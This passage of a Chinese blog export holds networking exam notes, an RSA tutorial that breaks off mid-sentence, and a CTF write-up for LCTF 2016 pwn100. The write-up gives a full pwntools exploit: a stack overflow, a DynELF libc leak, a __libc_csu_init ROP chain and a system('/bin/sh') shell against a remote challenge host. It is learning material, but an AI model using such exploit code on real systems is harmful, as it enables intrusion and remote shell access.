Resolution Protocol，地址解析协议）是根据IP地址获取物理地址的一个TCP/IP协议。RARP: （Reverse Address Resolution Protocol，逆地址解析协议）,该协议允许局域网的物理机器从网关服务器的 ARP 表或者缓存上请求其 IP 地址。ICMP:（Internet Control Message Protocol，Internet控制报文协议。）RIP:(Routing Information Protocol,路由信息协议）是一种内部网关协议,是一种动态路由选择协议。OSPF: （Open Shortest Path First，开放最短路径优先），该协议是用于网际协议网络的链路状态路由协议。CIDR: （Classless Inter-Domain Routing，无类别域间路由）该协议是一个用于给用户分配IP地址以及在互联网上有效地路由IP数据包的对IP地址进行归类的方法。VLSM: （Variable Length Subnet Mask，可变长子网掩码）该协议的目的是最有效地利用现有的地址空间。VPN: （Virtual Private Network，虚拟专用网络）NVT: （network virtual terminal，网络虚拟终端）Q5 为何构建虚拟互联网使用虚拟互连网络的好处是：当互联网上的主机进行通信时，就好像在一个网络上通信一样，而看不见互连的各具体的网络异构细节。Q6 和IP地址相关的一些知识分类的IP地址A&lt;128&lt;=B&lt;192&lt;=C其中ABC类IP为单播地址。支持子网掩码的IP由分类的IP地址变到支持子网掩码的IP地址解决了IP资源不够的问题。无分类的IP (CIDR)由支持子网掩码的IP变成无分类的IP解决了路由表内容暴增的问题。无分类的IP利用了网络聚合技术。举例1:128.14.32.0/20 表示的地址块共有 2^12 个地址（因为斜线后面的 20 是网络前缀的位数，而IP总位数为32，所以这个地址的主机号是 32-20=12 位）。举例2:Q7 IP地址如何由路由器进行转发对于分类的IP地址例题:对于划分子网的IP地址例题:Q8 ARP协议的工作原理Q9 IP数据报首部20个字节里的内容及含义 (重点)其中我们的固定部分就是首部的20字节,每行32位,占4字节,共5行,总计20字节。我们的可变部分最大40字节。版本——占 4 位，指 IP 协议的版本。目前的 IP 协议版本号为 4 (即 IPv4)首部长度——占 4 位，可表示的最大数值，是 15 个单位(一个单位为 4 字节)，因此 IP 的首部长度的最大值是 60 字节。区分服务——占 8 位，用来获得更好的服务，在旧标准中叫做服务类型，但实际上一直未被使用过。1998 年这个字段改名为区分服务。只有在使用区分服务（DiffServ）时，这个字段才起作用。在一般的情况下都不使用这个字段 。总长度——占 16 位，指首部和数据之和的长度，单位为字节，因此数据报的最大长度为 65535 字节。总长度必须不超过最大传送单元 MTU。标识——占 16 位，它是一个计数器，用来产生数据报的标识。标志——占 3 位，目前只有前两位有意义。标志字段的最低位是 MF (More Fragment)。MF = 1 表示后面“还有分片”。MF = 0 表示最后一个分片。标志字段中间的一位是DF (Don&#39;t Fragment)。只有当DF = 0 时才允许分片。 ps: 分片接下来会介绍。片偏移(12 位)指出：较长的分组在分片后，某片在原分组中的相对位置。片偏移以 8 个字节为偏移单位。生存时间(8 位)记为 TTL (Time To Live)数据报在网络中可通过的路由器数的最大值。协议(8 位)字段指出此数据报携带的数据使用何种协议以便目的主机的 IP 层将数据部分上交给哪个处理过程首部检验和(16 位)字段只检验数据报的首部，不检验数据部分。这里不采用 CRC 检验码而采用简单的计算方法。源地址和目的地址都各占 4 字节分片在标志和片偏移中我们谈到一个新词分片,下面介绍一下分片:把一个数据报为了适合网络传输而分成多个数据报的过程称为分片，被分片后的各个IP数据报可能经过不同的路径到达目标主机。一个IP数据报在传输过程中可能被分片，也可能不被分片。如果被分片，分片后的IP数据报和原来没有分片的IP数据报结构是相同的，即也是由IP头部和IP数据区两个部分组成：分片后的IP数据报，数据区是原IP数据报数据区的一个连续部分，头部是原IP数据报头部的复制，但与原来未分片的IP数据报头部有两点主要不同：标志和片偏移：下面举个例子:Q10 路由器的两大功能路由和转发Q11 RIP和OSPF 如何工作RIP协议RIP协议让互联网中的所有路由器都和自己的相邻路由器不断交换路由信息，并不断更新其路由表，使得从每一个路由器到每一个目的网络的路由都是最短的（即跳数最少）。ps: RIP协议基于距离向量算法，好消息传得快，坏消息传得慢。OSPF协议所以OSPF协议的工作原理可以概述为: 先通过问候确定数据报的可达性,然后通过与相邻路由器进行数据库描述达到数据库的同步,最后进行链路状态请求、链路状态更新、链路状态确认达到新情况下的同步。Q12 分配IP的方法 (重点)可分配的IP地址数等于 2^n,其中n是主机号的位数(二进制位数)。假设主机号占5位,则可分配的IP地址数为2^5 = 32可用的IP地址 = 可分配的IP地址数 - 2,需要减去全0的网络号和全1的广播地址。例题1问: 已知200.20.20.0/24，且已知部门1需要121个IP地址, 部门2需要60个IP地址, 部门3需要 30个IP地址 部门4需要10个IP地址, 怎么分配比较合理？为了方便分配,我们对每个部门都分配2的m次方个IP地址,需要满足2的m次方刚好大于等于我们需要的IP地址数。所以 部门1分配128个，部门2分配64个，部门3分配32个，部门4分配16个。我们把这段IP（叫法估计不太准确）转换成二进制的形式可以得到:11001000.00010100.00010100.00000000。IP地址一共32位,这道题其中前24位为网络前缀,后面8位为主机号。部门1分配到128个,128写成二进制就是10000000。由于后面的8位主机号能构成2个128, 我们取其中一个, 所以第25位数写0(默认优先写0)。然后后面的32-25=7位就可以任意组合了,一共128种组合,也就代表了128个IP地址。这样我们得到了部门1分得的IP段11001000.00010100.00010100.0/25。接下来给部门2分配IP段,由于我们的第25位在给部门1分配IP段的时候已经用过了(当时置为0了),所以在给其他部门分配的时候应该置为1。部门2分配64个,64写成二进制为00100000,仿照给部门1分配IP时的方法, 我们第26位要置为0,所以得到部门2的IP段为:11001000.00010100.00010100.10/26。部门3和部门4同理~所以最终得到:部门1得到的IP段为: 11001000.00010100.00010100.0/25，也可以记作从200.20.20.0到200.20.20.127部门2得到的IP段为: 11001000.00010100.00010100.10/26，也可以记作从200.20.20.128到200.20.20.191部门3得到的IP段为: 11001000.00010100.00010100.110/27，也可以记作从200.20.20.192到200.20.20.223部门4得到的IP段为: 11001000.00010100.00010100.1110/28，也可以记作从200.20.20.224到200.20.20.239例题2问: 200.20.20.0/24划分成16个子网该如何划分？16个子网也就是2^4个子网, 所以我们需要在主机号段从前往后借4位。所以我们得到子网掩码为: 11111111 11111111 11111111 11110000所以每个子网的IP数量为 2^4=16个 ps: 可以理解子网掩码还剩几个0就是2的几次方个。第一个子网的IP范围是200.20.20.0到200.20.20.15。也就是后八位00000000到00001111。第二个子网的IP范围是200.20.20.16到200.20.20.31。也就是后八位00010000到00011111。ps: 这里每个IP的第四个数都可以看作两部分组合而来的,以这道题为例,由于我们借了4位(第25到第28位),这四位能得到16个子网，而后面四位主机号也能重组得到16个主机号。二者组合得到IP地址的第四个数。 就比方说00011111在这道题中就是代表子网的四位0001和代表主机号的四位1111组合在一起来的。同理我们能得到第一个一直到第十六个子网各自的IP范围。其中主机号全0的网络号和主机号全1的广播地址不能用。所以第一个子网中最小的可用IP为:200。20.20.1,最大的可用IP为:200.20。20.14。同理我们也能求出其他子网中最小可用IP和最大可用IP。例题3问题依旧是给部门分配IP,但是这次我们知道的是 每个部门最多30台使用IP的设备。最多30台设备,那我们每个部门分配32(2^5)个IP,这次我们在主机号段,从后往前取5位让它自由组合。问法应该也就例题1和例题2里面的那几种吧…就不再重新问答一遍了…Q13 ICMP的功能ICMP 报文的种类有两种，即 ICMP 差错报告报文和 ICMP 询问报文。 ps: ICMP 报文作为 IP 层数据报的数据，加上数据报的首部，组成 IP 数据报发送出去。询问2：报错5:应用举例:Q14 全球IP地址和私有IP地址要背私有IP地址~Q15 VPN和NAT如何工作VPN 虚拟专用网络（Virtual Private Network）: 任意两个节点之间的连接并没有传统专网所需的端到端的物理链路，而是架构在公用网络服务商所提供的网络平台。NAT 网络地址转换 (Network Address Translation):第五章 运输层Q1 运输层的功能和协议功能: 运输层为应用进程之间提供端到端的逻辑通信。PS:但网络层是为主机之间提供逻辑通信。协议: TCP/IP、UDPQ2 TCP/IP 和 UDP 的对比Q3 端口端口的作用?(为什么要引入端口?):为了使运行不同操作系统的计算机的应用进程能够互相通信，就必须用统一的方法对 TCP/IP 体系的应用进程进行标志。因此我们在运输层使用协议端口号(protocol port number)，或通常简称为端口(port)。ps:端口分为软件端口和硬件端口。在协议栈层间的抽象的协议端口是软件端口。路由器或交换机上的端口是硬件端口。TCP的端口用一个16位的端口号进行标志。需要记一下HTTP的端口号是80,FTP的端口号是20和21，其中20用于传输数据，21用于传输控制信息。Q4 滑动窗口协议 (重点)这个博客挺不错的，可以根据这个博客学习一下滑动窗口协议。传送门Q5 TCP如何进行流量控制利用滑动窗口机制可以很方便地在 TCP 连接上实现流量控制。原理这就是运用TCP报文段中的窗口大小字段(在问题Q7中会有详细说明)来控制，发送方的发送窗口不可以大于接收方发回的窗口大小。考虑一种特殊的情况，就是接收方若没有缓存足够使用，就会发送零窗口大小的报文，此时发送放将发送窗口设置为0，停止发送数据。之后接收方有足够的缓存，发送了非零窗口大小的报文，但是如果这个报文在中途丢失的，那么发送方的发送窗口就一直为零导致死锁。为解决这个问题，TCP为每一个连接设置一个持续计时器（persistence timer）。只要TCP的一方收到对方的零窗口通知，就启动该计时器，周期性的发送一个零窗口探测报文段。对方就在确认这个报文的时候给出现在的窗口大小（注意：TCP规定，即使设置为零窗口，也必须接收以下几种报文段：零窗口探测报文段、确认报文段和携带紧急数据的报文段）。Q6 TCP如何进行拥塞控制两个概念: 接收端窗口（Reciver Window)又称通知窗口（Advertised Window),是接收端根据目前的接收缓存大小所许诺的最新窗口值，是来自接收端的流量控制。拥塞窗口cwnd（Congestion Window)是发送端根据自己估计的网络拥塞程度而设置的窗口值，是来自发送端的流量控制。 PS:发送报文段速率的确定，既要根据接收端的接收能力，又要从全局考虑不要使网络发生拥塞，这由接收窗口和拥塞窗口两个状态量确定。四个策略: 即慢开始（Slow-start)，拥塞避免（Congestion Avoidance)，快重传（Fast Restrangsmit)和快恢复（Fast Recovery）慢开始当主机开始发送数据时，如果立即将较大的发送窗口的全部数据字节都注入到网络中，那么由于不清楚网络的情况，有可能引其网络拥塞。慢开始算法:在主机刚刚开始发送报文段时可先设置拥塞窗口 cwnd = 1，即设置为一个最大报文段 MSS 的数值。发送方每收到一个对新报文段的确认（重传的不算在内）就使 拥塞窗口cwnd 加 1，即增加一个 MSS 的数值。这样每经过一个传输轮次会使拥塞窗口cwnd加倍，这样会使拥塞窗口cwnd成指数型增长。但是指数型增长是非常恐怖的, 为了进行拥塞控制, 我们引入了慢开始门限状态变量ssthresh作为一个阀值。拥塞控制算法拥塞避免算法的思路是让拥塞窗口 cwnd 缓慢地增大，即每经过一个往返时间 RTT 就把发送方的拥塞窗口 cwnd 加 1，而不是加倍，使拥塞窗口 cwnd 按线性规律缓慢增长。当出现网络拥塞时举例乘法减小 &amp;&amp; 加法增大乘法减小是指不论在慢开始阶段还是拥塞避免阶段，只要出现一次网络拥塞，就把慢开始门限值 ssthresh 设置为当前的拥塞窗口值cwnd乘以 0.5。ps: 当网络频繁出现拥塞时，ssthresh 值就下降得很快，以大大减少注入到网络中的分组数。加法增大是指执行拥塞避免算法后，在收到对所有报文段的确认后（即经过一个往返时间），就把拥塞窗口 cwnd增加一个 MSS 大小，使拥塞窗口缓慢增大，以防止网络过早出现拥塞。快重传快恢复otherTCP如何判断出现拥塞？出现重传或者连续收到三个重复的确认Q7 TCP报文首部20字节的内容及含义从这个头部的源端口和目的端口也能看出来运输层为应用进程之间提供端到端的逻辑通信。PS:但网络层是为主机之间提供逻辑通信。Q8 超时重传时间如何计算TCP 每发送一个报文段，就对这个报文段设置一次计时器。只要计时器设置的重传时间到但还没有收到确认，就要重传这一报文段。超时重传时间要比当前通讯的两点之间的往返时延大一些Q9 TCP的三次握手TCP连接的建立(三次握手):-（1）第一次握手：客户将标志位SYN置为1，随机产生一个值seq=x，并将该数据包发送给服务器，等待服务器确认。-（2）第二次握手：服务器收到数据包后由标志位SYN=1知道客户请求建立连接，服务器将标志位SYN和ACK都置为1，ack=x+1，随机产生一个值seq=y，并将该数据包发送给客户以确认连接请求。-（3）第三次握手：客户收到确认后，检查ack是否为x+1，ACK是否为1，如果是则将标志位ACK置为1，ack=y+1，并将该数据包发送给服务器，服务器检查ack是否为y+1，ACK是否为1，如果是则连接建立成功，完成了三次握手，随后客户与服务器之间可以开始传输数据了。补充一下TCP连接的释放,但愿不考,太多了记不过来了:已完结","categories":[{"name":"随手小记","slug":"随手小记","permalink":"http://liul14n.top/categories/随手小记/"}],"tags":[]},{"title":"LCTF 2016 pwn100","slug":"LCTF-2016-pwn100","date":"2019-12-02T05:29:01.000Z","updated":"2019-12-03T12:32:49.054Z","comments":true,"path":"2019/12/02/LCTF-2016-pwn100/","link":"","permalink":"http://liul14n.top/2019/12/02/LCTF-2016-pwn100/","excerpt":"","text":"0x00 前言这是一道很有学习价值的题目。通过这道题目,我学到了DynELF模块的用法、一些ROP技巧等。感谢大佬们开发的各种工具、解锁的各种姿势,愿我也能站在巨人的肩膀上。0x01 分析12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000)123456789101112131415161718192021222324252627282930__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; setbuf(stdin, 0LL); setbuf(stdout, 0LL); sub_40068E(); return 0LL;&#125;int sub_40068E()&#123; char v1; // [rsp+0h] [rbp-40h] sub_40063D((__int64)&amp;v1, 200); return puts(\"bye~\");&#125;__int64 __fastcall sub_40063D(__int64 a1, signed int a2)&#123; __int64 result; // rax unsigned int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; ; ++i ) &#123; result = i; if ( (signed int)i &gt;= a2 ) break; read(0, (void *)((signed int)i + a1), 1uLL); &#125; return result;&#125;sub_40063D函数就相当于一个read函数,不过必须读够200个字节且每次读一个字节,这里存在明显的栈溢出。v1距离rbp只有0x40个字节,但是却读入200个字节。由于程序里面并没有后门函数且题目并没有给我们libc，这就要求我们想办法获取目标系统的libc。关于远程获取libc，pwntools在早期版本就提供了一个解决方案——DynELF类。DynELFl的官方文档见此：DynELFl的官方文档其具体的原理可以参阅文档和源码。简单地说，DynELF通过程序漏洞泄露出任意地址内容，结合ELF文件的结构特征获取对应版本文件并计算比对出目标符号在内存中的地址。所以总体思路就是先通过DynELF模块拿到system函数的地址,然后想办法执行system(&quot;/bin/sh&quot;);。0x02 通过DynELF模块泄露出system函数的地址DynELF模块需要我们提供一个leak方法,而且需要程序里面有能够调用的输出函数,如write、puts、printf。其实DynELF模块就相当于循环得出任意地址里的内容的一个工具。每次由这个模块自动传入一个地址,然后多次调用leak(addr)去泄露这个地址里面的内容,通过泄露的内容与ELF文件的结构特征比对,从而获得对应的libc版本,进而能获得我们的目标函数(我们搜索的函数)所在地址。构造传统的payload基于这个思想,我们先来写一个通过溢出,让程序通过puts函数输出指定地址里的内容的payload。由于puts函数: int puts(const char *s)只有一个参数,这个参数就是我们所要输出的内容所在的地址,64位程序的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中,第七个及以后的参数才保存在栈中。所以puts函数的参数需要保存到RDI中。所以我们需要先通过ROPgadget找到pop rdi;ret的地址。如果不太清楚为什么这么做的话,可以看我的另一篇博客,里面有很详细的讲解及调试。传送门具体命令为:ROPgadget --binary pwn100 --only &#39;pop|ret&#39; | grep rdi。得到结果0x0000000000400763 : pop rdi ; ret。有了pop rdi ; ret以后,我们就可以任选一个想输出其内容的地址来构造我们的payload了。123456789101112from pwn import *c = process('./pwm100')elf = ELF(\"./pwn100\")puts_addr = elf.plt['puts']pop_rdi = 0x400763payload = \"A\" *(0x40 + 8)payload += p64(pop_rdi)payload += p64(0x400000) #任选的payload += p64(puts_addr)payload = payload.ljust(200, \"B\")c.send(payload)print c.recv()由传统payload转成leak方法理解了这个payload的原理以后,我们就可以去构造我们需要的leak方法了。小难点1前面我们也提到过了, 我们的leak方法必须能够多次被调用。能被多次调用也就意味着我们的栈空间要跟第一次调用的时候基本保持一致,如果不一致,最先导致的一个问题就是参数传递问题,可能在传递和调用过程中,栈空间就被消耗完了。所以这里我们把调用完puts以后的返回地址修改成start,这个函数在IDA里面能够看到。这是一段编译器添加的代码,用于初始化程序的运行环境后，执行完相应的代码后会跳转到程序的入口函数main函数去运行程序代码。也就是说,我们通过每次返回到start函数就能实现每次相当于重新加载程序的效果。小难点2由于这道题目我们能够利用的puts函数的输出长度是不受控制的,它遇到\\x00才会停止输出。所以我们需要自行添加上\\x00。leak方法克服了几个小困难以后我们得到leak方法。12345678910111213141516171819202122232425# -*- coding: UTF-8 -*-def leak(addr): count = 0 up = '' content = '' payload = 'A'*(0x40 + 8) #padding payload += p64(pop_rdi) #将puts的参数传给rdi payload += p64(addr) #puts的参数 payload += p64(puts_addr) #调用puts()函数 payload += p64(start_addr) #跳转到start，恢复栈 payload = payload.ljust(200, 'B') #padding,因为需要读满200 io.send(payload) io.recvuntil(\"bye~\\n\") while True: #无限循环读取，防止recv()读取输出不全 c = io.recv(numb=1, timeout=0.1) #每次读取一个字节，设置超时时间确保没有遗漏 count += 1 if up == '\\n' and c == \"\": #上一个字符是回车且读不到其他字符，说明读完了 content = content[:-1]+'\\x00' #最后一个字符置为\\x00 break else: content += c #拼接输出 up = c #保存最后一个字符 content = content[:4] #截取输出的一段作为返回值，提供给DynELF处理 log.info(\"%#x =&gt; %s\" % (addr, (content or '').encode('hex'))) return content仔细想一想,我们可以发现,这个leak方法其实就是一个模板, 我们只需要提供溢出payload然后稍作改动就行,大体代码不变。泄露system函数地址我们有了leak方法以后还需要实例化一个DynELF对象,用这个对象去泄露我们的system函数地址。123d = DynELF(leak, elf = elf)sys_addr = d.lookup('system', 'libc')log.info(\"system_addr =&gt; %#x\", sys_addr)这样我们就能够拿到system函数地址了。所以泄露system函数的完整代码为:12345678910111213141516171819202122232425262728293031323334353637# -*- coding: UTF-8 -*-from pwn import *io = remote('111.198.29.45',32873)#端口要根据自己创建的环境来。elf = ELF(\"./pwn100\")start_addr = 0x400550pop_rdi = 0x400763puts_addr = elf.plt['puts']def leak(addr): count = 0 up = '' content = '' payload = 'A'*(0x40 + 8) #padding payload += p64(pop_rdi) #将puts的参数传给rdi payload += p64(addr) #puts的参数 payload += p64(puts_addr) #调用puts()函数 payload += p64(start_addr) #跳转到start，恢复栈 payload = payload.ljust(200, 'B') #padding,因为需要读满200 io.send(payload) io.recvuntil(\"bye~\\n\") while True: #无限循环读取，防止recv()读取输出不全 c = io.recv(numb=1, timeout=0.1) #每次读取一个字节，设置超时时间确保没有遗漏 count += 1 if up == '\\n' and c == \"\": #上一个字符是回车且读不到其他字符，说明读完了 content = content[:-1]+'\\x00' #最后一个字符置为\\x00 break else: content += c #拼接输出 up = c #保存最后一个字符 content = content[:4] #截取输出的一段作为返回值，提供给DynELF处理 log.info(\"%#x =&gt; %s\" % (addr, (content or '').encode('hex'))) return contentd = DynELF(leak, elf = elf)sys_addr = d.lookup('system', 'libc')log.info(\"system_addr =&gt; %#x\", sys_addr)运行可得system_addr。从运行结果来看,我们也能明白DynELF模块大致的工作原理。0x03 ROP获得/bin/sh有了system函数以后,还需要有它的参数/bin/sh。我们可以找到一个具有读写权限的地址,写入/bin/sh。通过vmmap命令或者在IDA里面找bss段等都可以找到合适的地址。我们发现0x601000到0x602000之间的地址都具有读写权限。我们任选一个地址binsh_addr = 0x601500用于写入/bin/sh。我们需要构造ROP链来实现写入/bin/sh。由于我们的read函数: read(int fd, void *buf, size_t count),有三个参数,所以我们采用的gadgets为:gadget1(0x40075A):1234567.text 000000000040075A pop rbx.text:000000000040075B pop rbp.text:000000000040075C pop r12.text:000000000040075E pop r13.text:0000000000400760 pop r14.text:0000000000400762 pop r15.text:0000000000400764 retngadget2(0x400740):123456789101112131415161718.text 0000000000400740 loc_400740:.text:0000000000400740 mov rdx, r13.text:0000000000400743 mov rsi, r14.text:0000000000400746 mov edi, r15d.text:0000000000400749 call qword ptr [r12+rbx*8].text:000000000040074D add rbx, 1.text:0000000000400751 cmp rbx, rbp.text:0000000000400754 jnz short loc_400740.text:0000000000400756.text:0000000000400756 loc_400756:.text:0000000000400756 add rsp, 8.text:000000000040075A pop rbx.text:000000000040075B pop rbp.text:000000000040075C pop r12.text:000000000040075E pop r13.text:0000000000400760 pop r14.text:0000000000400762 pop r15.text:0000000000400764 retn这是__libc_csu_init函数的通用gadget。通过这两段gadget,我们能发现这么一个关系。1234r13 == rdx == arg3r14 == rsi == arg2r15d == edi == arg1r12 == call address所以得到。12345678.text 000000000040075A pop rbx 必须为0.text:000000000040075B pop rbp 必须为1.text:000000000040075C pop r12 call address,即我们需要调用的函数的地址.text:000000000040075E pop r13 调用的函数的参数3.text:0000000000400760 pop r14 调用的函数的参数2.text:0000000000400762 pop r15 调用的函数的参数1.text:0000000000400764 retn 我们需要返回到gadget2 因为参数真正传给rdi、rsi、rdx是在gadget2123456789101112131415161718.text 0000000000400740 loc_400740:.text:0000000000400740 mov rdx, r13.text:0000000000400743 mov rsi, r14.text:0000000000400746 mov edi, r15d.text:0000000000400749 call qword ptr [r12+rbx*8] 调用.text:000000000040074D add rbx, 1.text:0000000000400751 cmp rbx, rbp.text:0000000000400754 jnz short loc_400740.text:0000000000400756.text:0000000000400756 loc_400756:.text:0000000000400756 add rsp, 8.text:000000000040075A pop rbx.text:000000000040075B pop rbp.text:000000000040075C pop r12.text:000000000040075E pop r13.text:0000000000400760 pop r14.text:0000000000400762 pop r15.text:0000000000400764 retn从而我们的ROP链为:123456789101112payload='A'*(0x40 + 8)payload+=p64(gadget1)payload+=p64(0) #rbx=0payload+=p64(1) #rbp=1 payload+=p64(read_got) #call read()payload+=p64(8) #sizepayload+=p64(binsh_addr) #bufpayload+=p64(0) #stdinpayload+=p64(gadget2) #ret to gadget2payload+='\\x00'*56 #注意这里。payload+=p64(start_addr) #ret to start_addrpayload=payload.ljust(200,'a')上方payload中有一处 payload+=&#39;\\x00&#39;*56, 这里相当于计算了一下RSP与RIP的偏移。由于我们的gadget2中在调用完call qword ptr [r12+rbx*8]后,RSP是指向ret_addr的,然后我们会执行这一系列指令。1234567.text:0000000000400756 add rsp, 8.text:000000000040075A pop rbx.text:000000000040075B pop rbp.text:000000000040075C pop r12.text:000000000040075E pop r13.text:0000000000400760 pop r14.text:0000000000400762 pop r15首先add指令导致rsp += 8, 然后有6个pop,每次pop都会导致rsp += 8,也就是rsp一共加了(1+6)*8 = 56个字节。所以我们要在距离调用完call qword ptr [r12+rbx*8]后的56个字节的位置放置我们真正的ret_addr。get shell剩下的就是另一个ROP链了:12345payload = \"A\"*(0x40 + 8)payload += p64(pop_rdi)payload += p64(binsh_addr)payload += p64(system_addr)payload = payload.ljust(200, \"B\")所以我们完整的exp为:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# -*- coding: UTF-8 -*-from pwn import *# context.log_level = 'debug'io = remote('111.198.29.45',32873)#io = process(\"./pwn100\")elf = ELF(\"./pwn100\")gadget1 = 0x40075A #pop rbx_rbp_r12_r13_r14_r15gadget2 = 0x400740 #rdx(r13), rsi(r14), edi(r15d)pop_rdi_ret = 0x400763# start_addr = elf.symbols['_start']start_addr = 0x400550puts_plt = elf.plt['puts']read_got = elf.got['read']binsh_addr = 0x601500def leak(addr): payload = \"a\" * 0x48 + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(start_addr) payload = payload.ljust(200, \"a\") io.send(payload) io.recvuntil(\"bye~\\n\") up = \"\" content = \"\" count = 0 while True: c = io.recv(numb=1, timeout=0.5) count += 1 if up == '\\n' and c == \"\": content = content[:-1] + '\\x00' break else: content += c up = c content = content[:4] log.info(\"%#x =&gt; %s\" % (addr, (content or '').encode('hex'))) return contentd = DynELF(leak, elf = elf)sys_addr = d.lookup('system', 'libc')log.info(\"system_addr =&gt; %#x\", sys_addr)payload = \"a\" * 0x48 + p64(gadget1) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(binsh_addr) + p64(1)payload += p64(gadget2)payload += \"\\x00\" * 56payload += p64(start_addr)payload = payload.ljust(200, \"a\")io.send(payload)io.recvuntil(\"bye~\\n\")io.send(\"/bin/sh\\x00\")payload = \"a\" * 0x48 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)payload = payload.ljust(200, \"a\")io.send(payload)io.interactive()0x04 参考链接感谢各位师傅。i春秋安全客简书","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://liul14n.top/categories/Pwn/"}],"tags":[]},{"title":"RSA从入门到入土","slug":"RSA从入门到入土","date":"2019-11-29T14:04:54.000Z","updated":"2020-06-09T11:03:56.902Z","comments":true,"path":"2019/11/29/RSA从入门到入土/","link":"","permalink":"http://liul14n.top/2019/11/29/RSA从入门到入土/","excerpt":"","text":"数学,如星空一般美丽又神秘简介RSA是1977年由Ron Rivest、Adi Shamir、Leonard Adleman一起提出的。当时他们三人都在麻省理工学院工作。RSA就是他们三人姓氏开头字母拼在一起组成的。RSA是目前最有影响力和最常用的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准。RSA算法基于一个十分简单的数论事实：将两个大质数相乘十分容易，但是想要对其乘积进行因式分解却极其困难，因此可以将乘积公开。本文将介绍RSA算法所需的知识基础、RSA算法基本原理。知识储备RSA算法加解密其实就是两个公式，但是为了理解这两个公式我们需要学习数论中的四个概念：互质、欧拉函数、欧拉定理、模反元素，这四个概念都是非常好理解的，只需要有初高中的数学知识就能理解。互质关系互质整数是公约数只有1的两个整数,比如15和32,这说明不是质数也可以构成互质关系。关于互质关系,有以下结论:任意两个质数构成互质关系，比如13和61一个数是质数，另一个数只要不是前者的倍数，两者就构成互质关系，比如3和10如果两个数之中，较大的那个数是质数，则两者构成互质关系，比如97和57p是大于1的奇数，则p和p-2构成互质关系，比如27和25p是大于1的整数，则p和p-1构成互质关系，比如53和521和任意一个自然数是都是互质关系，比如1和99欧拉函数欧拉函数听起来很高大上，但其实非常简单，欧拉函数是小于x的整数中与x互质的数的个数，一般用φ(x)表示。例如φ(8)就等于4,因为8以内的与8互质的数只有1、3、5、7这四个数。关于欧拉函数有几点性质:特殊的，φ(1)=1。如果n是质数，则 φ(n)=n-1 。因为质数与小于它的每一个数，都构成互质关系。比如5与1、2、3、4都构成互质关系。如果n是质数的某一个次方，即 n = p^k (p为质数，k为大于等于1的整数)，则 比如 φ(8) = φ(2^3) =2^3 – 2^2 = 8 -4 = 4。如果n可以分解成两个互质的整数之积,即n = p1 × p2,则φ(n) = φ(p1p2) = φ(p1) × φ(p2)。欧拉定理欧拉函数的用处，在于欧拉定理，而欧拉定理是RSA算法的核心。欧拉定理指的是: 如果两个正整数a和n互质，则n的欧拉函数 φ(n) 可以让下面的等式成立：其中’≡’是恒等号(在这也可叫为同余号),表示该等式始终成立而与n、a的值无关。这个式子的含义为:a的φ(n)次方除以n的余数为1。欧拉定理的证明较为复杂,我们只需要记住这条结论就行,挺好记的。模反元素如果两个正整数a和n互质，那么一定可以找到整数b(不一定唯一)，使得 ab-1 被n整除，或者说ab除以n的余数是1。即 ab≡1 (mod n), 这时，b就叫做a的“乘法逆元（乘法模反元素）”。比如，5和17互质，那么7就是5的模反元素,同时24、41、58…都是5的模反元素，即如果b是a的模反元素，则 b+kn 都是a的模反元素。明文and密文最后我们介绍一组概念。明文(Plain Text):明文，是指没有加密的文字（或者字符串），属于密码学术语。密文(Cipher Text):密文是加了密的的文字。即明文是加密之前的文字。密文是对明文进行加密后的报文。看得有点迷?没关系,后面有具体示例RSA算法基本原理RSA是一种非对称加密算法。非对称加密算法的优点我们会在后面的RSA加解密演示中介绍到。在进行RSA加密与解密之前,我们先要有RSA密钥,即公钥和私钥。我们用公钥对明文进行加密, 用私钥对密文进行解密。公钥是可以让所有人都知道的,但是私钥只能我们自己知道。密钥生成规则(1)随机选择两个不相等的质数p和q我们选择61和53,在实际应用中,这两个质数越大就越难破解。(2)计算p和q的乘积nn = 61 * 53 = 32333233写成二进制是110010100001共12位,故该密钥是12位的,目前主流可选值：1024、2048、3072、4096…低于1024bit的密钥已经不建议使用（安全问题）。(3)计算n的欧拉函数φ(n)因为n = p*q,由欧拉函数的小性质 ,如果n = p × q且p、q互质,则φ(n) = φ(pq) = φ(p)φ(q)。由于我们的p和q都是质数,再一次由欧拉函数的小性质如果n是质数，则 φ(n)=n-1,可得φ(p) = p-1 , φ(q) = q - 1。所以我们的φ(n) = (p-1)(q-1)所以我们例子中的φ(n) = 60×52 = 3120。(4)按照条件随机选择一个整数e选择e的条件是 1&lt; e &lt; φ(n)，且e与φ(n) 互质。本例中选取e = 17,但实际应用中e常常取65537 。(5)计算e对于φ(n)的模反元素d根据欧拉定理我们有:ed ≡ 1 ( mod φ(n) )即 ed–kφ(n)=1将e = 17,φ(n) = 3120代入可得:17d–3120k=1这里我们采用拓展欧几里得算法求解d的值。拓展欧几里得算法可用来求解线性同余方程a∗x≡c(modb) 且c=1的情况。我们可以把该方程转换成a∗x+b∗y=1这种形式。此处给出求解代码:1234567891011121314151617181920# -*- coding: UTF-8 -*-def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('modular inverse does not exist') else: return x % me = 17phin = 3120 d = modinv(e,phin) print 'd = ' + str(d)这样求出我们的d = 2753。(6) 将n和e封装成公钥,n和d封装成私钥前面我们已经求出来了:p = 61q = 53; 或者写成p = 53,q = 61都可以。n = pq = 3233φ(n) = (p-1)(q-1) = 3120e = 17; 满足1&lt; e &lt; φ(n)，且e与φ(n) 互质。d = 2753;e对于φ(n)的模反元素d。所以我们的公钥就是(n,e) = (3233,17),私钥就是(n,d) = (3233,2753)。RSA算法可靠性分析我们一共生成了六个数字：p、q、n、φ(n)、e、d，这六个数字之中，公钥用到了两个（n和e），其余四个数字都是不公开的。其中最关键的是d，因为n和d组成了私钥，一旦d泄漏，就等于私钥泄漏。那么，有无可能在已知n和e的情况下，推导出d？ed≡1 (mod 